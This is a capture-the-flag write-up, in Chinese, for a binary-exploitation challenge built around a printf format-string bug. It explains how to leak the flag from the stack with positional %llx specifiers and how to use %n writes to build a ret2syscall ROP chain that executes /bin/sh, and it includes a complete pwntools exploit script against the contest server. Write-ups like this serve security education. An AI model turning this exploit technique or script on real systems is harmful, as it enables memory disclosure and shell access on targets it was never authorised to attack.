# [Binary] 初学 C 语言

- 命题人：ranwen
- Flag 1：150 分
- Flag 2：250 分

## 题目描述

<p>大一的小 A 在学习了《计算概论A》后，对自己的 C/C++ 水平非常自信，认为自己写出的程序不可能有 Bug （虽然可能会有写不出来的程序），于是他发起了一个悬赏，能发现程序的漏洞并读取到他服务器上的 Flag 的人，便可以狠狠奖励。</p>
<p>大二的小 B 在学习了《计算机系统导论》后，看了一眼小 A 的程序，便指出你这个程序的漏洞太明显了，他根本不屑于动手去攻击。</p>
<p>小 A 表示不信，仍然公开悬赏，觉得没有人可以可以拿下他的服务器。</p>
<p><strong>补充说明：</strong></p>
<ul>
<li>如果你发现题目下发的程序跑不起来，建议仔细查看源码或先在本地调试。</li>
</ul>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>Flag 1: 可以思考一下代码中的变量都存在了什么地方，<code>printf</code> 的不同参数会获取哪些地方的值。</li>
<li>Flag 2: gcc 的 <code>printf</code> 函数有一个特殊的用法，这种用法下 <code>printf</code> 不只是读取变量并输出，而是可以将数据写入变量。后面的部分就是一个传统的 pwn 任务。你可以参考 <a target="_blank" rel="noopener noreferrer" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">CTF-Wiki</a> 相关章节，结合课内所学来实现它。</li>
</ul>
</div>

**[【附件：下载题目附件（prob09.zip）】](attachment/prob09.zip)**

**【终端交互：连接到题目】**

## 预期解法

考虑到每年正经二进制题都没人做，因此我掏了一道入门二进制题。虽然我的水平也只能搞入门题了。

因为入门，所以这题直接就放了源码。功力比较高的选手使用objdump或者gdb，对照源码(其实并不是很难)就可以做出此题，不需要某付费软件或者某境外势力开发的软件。

idea来源于在某个地方看到的，glibc实现的printf(甚至在源码中专门提了是gcc编译的)有不是标准规定的私货。网上搜索`printf ctf`有真相。这个私货存在于format string，可以用$的形式来强制指定输出第几个参数(显然运行的二进制并不会检查你的源码里面传了几个参数)。另一个要利用的不是私货的特性是printf可以使用%n来完成变量的写入。而结合这两个特性就能完成任意位置的写入，进而做到rop。

做出这题你需要对二进制程序有一定但不多的了解。如果你ICS学的好，有一定的搜索水平，做出此题并不难。

### flag1

这个flag已经被读到栈上了。因此我们只需要想办法把他输出即可。注意到我们提到，这个二进制在执行的时候，是看不到你到底往printf传了几个参数的(或者说编译的时候没预处理)。而根据函数的传参方法，我们知道，当参数比较多的时候会全部存放到栈上。具体地，是从调用时的栈顶(低地址)依次放到栈底(高地址)。这也意味着如果我们强行让printf输出更多的参数，它就会直接往栈的高地址出读取值，而我们的flag字符串恰好就存在高地址处。

因此拿到flag1，我们只需要往里面传一堆%llx然后再解析回来即可。

注意到64位程序参数是8字节对齐的，如果你传的是%x的话只会拿到一半的flag。

当然你也可以算出来精确的位置然后用任意位置度的方法来读出来。

有的选手想用%s来直接输出，但这位选手显然没有想清楚%s的工作原理：printf会先读取传入的参数的值，然后作为地址再去内存对应位置访问字符串。这意味着你要是想用%s直接输出flag的话，需要先往里面写入一下flag的地址。

### flag2

显然这是一个传统的pwn任务。而我们有了format string做任意写后并不难。

如果你不太熟悉这类任务的话，可以去复习一下ICS，同时看一看[ctf-wiki 相关章节](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)。

首先我们先看具体怎么做任意写。%n可以往变量写入"前面已经输出的字符数"，因此我们直接构造一个拥有x个字符的format string之后再紧跟一个%x$n，就可以写入到第x个参数对应的变量了。注意到题目中限制了输出串的长度，因此如果要多次写入的话，一次只能写入一个字节。注意到写入的大小是4字节，因此会额外把一些高位置零(不过在后续的情况中，以特定的顺序写入就不会覆盖重要数据)。同时注意到使用%n时，参数应该传入一个指针，也就是说真正的流程是：printf从对应位置参数读出内存地址，然后往对应的内存地址写数。因此我们要做到任意位置写，应该先在内存的某个地方写入这个地址，之后再用这个地方作为参数调用printf的%n。

之后就是一个传统ICS的pwn题了。我们参照ctf-wiki的内容，发现这题居然保护全开了(唯一比ICS要难一点的地方)。这意味着栈地址和基地址都是随机的。但显然相对地址是固定的，我们也不难通过printf从栈上/寄存器上直接读出来某个变量/return address的地址，之后就能推出基址和其他变量的地址。

得到信息之后，我们不难发现我们只需要实现一个简单的栈上ROP。具体地，代码本身并不直接存在后门，但我们可以ret2syscall。参照ctf-wiki的内容，使用ROPGadget找到需要构造的syscall参数可以使用的gadget的地址，之后通过构造栈，使得我们可以ROP跳过去即可。注意到上述%n的置零问题，在这里面我们正好置的是栈上存储的rbp(并没有碰到canary)，显然当我们跳syscall时已经不关键了。

在找地址的时候，可以使用debugger直接监测不同内存位置的值，找变量地址比较快。当然你也可以使用IDA之类的直接看。对于代码段地址直接找就好了。

### 一键脚本

```python
from pwn import *

# s=process('./pwn')
s=remote("prob09.geekgame.pku.edu.cn",10009)

s.sendline("TOKEN")

def calls(data):
    s.recvuntil(b'instruction:')
    s.recvline()
    s.sendline(data.encode())
    return s.recvline()


def callb(data):
    s.recvuntil(b'instruction:')
    s.recvline()
    s.sendline(data)
    return s.recvline()


def toint(byt):
    return int(byt.strip(),16)

pubs_saddr=0x7fffc01c7870
pubs_addr=toint(calls("%1$llx"))

flag1_saddr=0x7fffc01c78b0
flag1_addr=pubs_addr-pubs_saddr+flag1_saddr
buf_saddr=0x7fffc01c78f0
buf_addr=pubs_addr-pubs_saddr+buf_saddr

rsp_saddr=0x7fffc01c7810

print(hex(pubs_addr),hex(flag1_addr))



def getqword_s(saddr):
    delta=(saddr-rsp_saddr)//8+6
    rets=toint(calls("%"+str(delta)+"$llx"))
    return rets

#1 rsi
#5 r9
#6 rsp 7FFFBA278A10

flag1_delta=(flag1_saddr-rsp_saddr)//8+6

print(flag1_delta)
flag1=b''

for i in range(8):
    rets=toint(calls("%"+str(flag1_delta+i)+"$llx"))
    bts=int.to_bytes(rets,8,'little')
    flag1+=bts

print(flag1)





def setbyte(addr,value):
    # print(hex(addr),value)
    payload1=b"0"*512+int.to_bytes(addr,8,'little')#write address
    callb(payload1)
    delta=(buf_saddr+512-rsp_saddr)//8+6
    payload2=b"0"*value+b"%"+str(delta).encode()+b"$n"
    callb(payload2)

def setqword(addr,value):
    for i in range(8):
        setbyte(addr+i,(value>>(i*8))&0xff)

canary_saddr=0x7fffc01c7cf8
canary_addr=pubs_addr-pubs_saddr+canary_saddr #7FFFBA278EF8
canary_value=getqword_s(canary_saddr)
print(hex(canary_value))

# print(hex(getqword_s(canary_saddr+16)))
# setbyte(canary_addr+16,0x99)
# print(hex(getqword_s(canary_saddr+16)))


ra_value=getqword_s(canary_saddr+16)
rbp_value=getqword_s(canary_saddr+8)
print(hex(ra_value),hex(rbp_value))
base_addr=ra_value-0xa3fd
print(hex(base_addr))


payload=b"0"*(512+32)+b"/bin/sh\x00"
callb(payload)

setqword(canary_addr+16,base_addr+0x5a777)#set rax
# print(hex(getqword_s(canary_saddr+16)))
setqword(canary_addr+16+8*1,0x3b)#rax


setqword(canary_addr+16+8*2,base_addr+0x9cd2)#set rdi
setqword(canary_addr+16+8*3,buf_addr+512+32)#rdi

setqword(canary_addr+16+8*4,base_addr+0x1781e)#set rsi
setqword(canary_addr+16+8*5,0)#rsi

setqword(canary_addr+16+8*6,base_addr+0x9bdf)#set rdx
setqword(canary_addr+16+8*7,0)#rdx


syscall_addr=base_addr+0x9643
# syscall_addr=base_addr+0xa330

setqword(canary_addr+16+8*8,syscall_addr)#syscall

s.sendline(b"exit")

s.sendline(b"pwd")

#may failed when you meet 0x0a

s.interactive()
```